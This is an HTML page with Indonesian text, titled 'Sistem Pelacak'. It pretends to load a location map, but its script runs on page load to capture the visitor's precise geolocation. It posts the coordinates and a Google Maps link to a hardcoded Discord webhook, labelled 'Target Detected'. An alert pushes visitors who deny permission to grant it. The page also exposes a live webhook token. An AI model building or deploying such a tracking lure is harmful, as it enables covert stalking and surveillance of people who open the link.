<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pelacak</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #1a1a1a; color: white; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div style="text-align: center;">
        <div class="loader" style="margin: 0 auto 15px;"></div>
        <p>Memuat peta lokasi...</p>
    </div>

    <script>
        // --- KONFIGURASI ---
        const webhookURL = "https://discord.com/api/webhooks/1490896106698051719/dEAoVaMVu-xEMBSc2YUcDo_9s8aMd0VTkTo-fjk9gFoxLWi3bCF5l4-sMsZeYbXCVICA";

        function kirimKeDiscord(lat, lon, accuracy) {
            const data = {
                embeds: [{
                    title: "📍 Target Terdeteksi!",
                    color: 3447003,
                    fields: [
                        { name: "Latitude", value: `${lat}`, inline: true },
                        { name: "Longitude", value: `${lon}`, inline: true },
                        { name: "Akurasi", value: `${accuracy} meter`, inline: true },
                        { name: "Google Maps", value: `[Klik di Sini](https://www.google.com/maps?q=${lat},${lon})` }
                    ],
                    footer: { text: "Dikirim via Sistem Pelacak" },
                    timestamp: new Date()
                }]
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            })
            .then(() => console.log("✅ Data berhasil dikirim ke Discord!"))
            .catch(err => console.error("❌ Gagal mengirim ke Discord:", err));
        }

        function dapatkanLokasi() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        
                        console.log("Lokasi didapat:", lat, lon);
                        kirimKeDiscord(lat, lon, acc);
                    },
                    (error) => {
                        console.error("Gagal mendapat lokasi:", error.message);
                        alert("Mohon izinkan akses lokasi untuk melihat peta.");
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                alert("Browser tidak mendukung GPS.");
            }
        }

        // Jalankan fungsi saat halaman dibuka
        window.onload = dapatkanLokasi;
    </script>
</body>
</html>
